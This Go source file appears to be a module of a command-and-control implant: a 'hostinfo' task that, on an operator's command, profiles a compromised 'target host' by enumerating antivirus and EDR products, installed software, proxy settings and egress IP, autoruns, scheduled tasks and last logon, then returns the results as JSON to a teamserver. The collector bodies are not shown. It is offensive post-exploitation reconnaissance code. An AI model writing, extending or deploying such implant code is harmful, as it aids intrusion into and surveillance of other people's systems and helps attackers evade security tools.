package main

// hostinfo — on-demand host profile collection.
//
// Unlike the per-beacon system info (which stays minimal), this task pulls a
// rich, structured picture of the target host on operator demand. The task
// command selects a category so one expensive sweep is never forced:
//
//	hostinfo security   -> AV products + running state, EDR indicators, security-relevant services
//	hostinfo system     -> OS install/boot time, integrity, memory snapshot
//	hostinfo software   -> installed software (Uninstall keys), optional filter via task.Data
//	hostinfo network    -> adapters, proxy settings (WinINET + env), egress IP
//	hostinfo runtime    -> autoruns (Run keys + Startup folder), scheduled tasks, last logon
//	hostinfo all        -> everything above
//
// Output is a single JSON document in res.Output (no base64) so the
// teamserver/frontend can render tables directly. Every collector runs under
// its own timeout and reports failures inline as {"error": "..."} instead of
// failing the whole report — a hung WMI query must not blind the operator.

import (
	"encoding/json"
	"fmt"
	"runtime"
	"strings"
	"time"
)

const (
	hostInfoCollectorTimeout = 10 * time.Second
	hostInfoCategoryAll      = "all"
)

var hostInfoCategories = []string{"security", "system", "software", "network", "runtime"}

// hostInfoReport is the wire shape of one hostinfo result.
type hostInfoReport struct {
	Category    string         `json:"category"`
	CollectedAt string         `json:"collected_at"`
	Platform    string         `json:"platform"`
	Filter      string         `json:"filter,omitempty"`
	Sections    map[string]any `json:"sections"`
}

func handleHostInfo(task Task, res *TaskResult) {
	category := strings.ToLower(strings.TrimSpace(task.Command))
	if category == "" {
		category = hostInfoCategoryAll
	}
	filter := strings.TrimSpace(task.Data)

	requested := hostInfoCategories
	if category != hostInfoCategoryAll {
		if !validHostInfoCategory(category) {
			res.Error = fmt.Sprintf("unknown category %q (want: all|security|system|software|network|runtime)", category)
			return
		}
		requested = []string{category}
	}

	report := hostInfoReport{
		Category:    category,
		CollectedAt: time.Now().UTC().Format(time.RFC3339),
		Platform:    runtime.GOOS,
		Filter:      filter,
		Sections:    make(map[string]any, len(requested)),
	}

	for _, cat := range requested {
		report.Sections[cat] = runHostInfoCollector(cat, filter)
	}

	out, err := json.Marshal(report)
	if err != nil {
		res.Error = "hostinfo encode: " + err.Error()
		return
	}
	res.Output = string(out)
}

// runHostInfoCollector executes one platform collector under an isolated
// timeout so a blocked WMI/schtasks call degrades to an inline error instead
// of stalling the whole beacon result.
func runHostInfoCollector(category, filter string) map[string]any {
	type result struct {
		data map[string]any
	}
	done := make(chan result, 1)
	go func() {
		var data map[string]any
		switch category {
		case "security":
			data = collectHostSecurity()
		case "system":
			data = collectHostSystem()
		case "software":
			data = collectHostSoftware(filter)
		case "network":
			data = collectHostNetwork()
		case "runtime":
			data = collectHostRuntime()
		default:
			data = map[string]any{"error": "unknown collector"}
		}
		done <- result{data: data}
	}()

	select {
	case r := <-done:
		if r.data == nil {
			return map[string]any{"error": "collector returned no data"}
		}
		return r.data
	case <-time.After(hostInfoCollectorTimeout):
		return map[string]any{"error": fmt.Sprintf("collector timed out after %s", hostInfoCollectorTimeout)}
	}
}

func validHostInfoCategory(c string) bool {
	for _, want := range hostInfoCategories {
		if c == want {
			return true
		}
	}
	return false
}
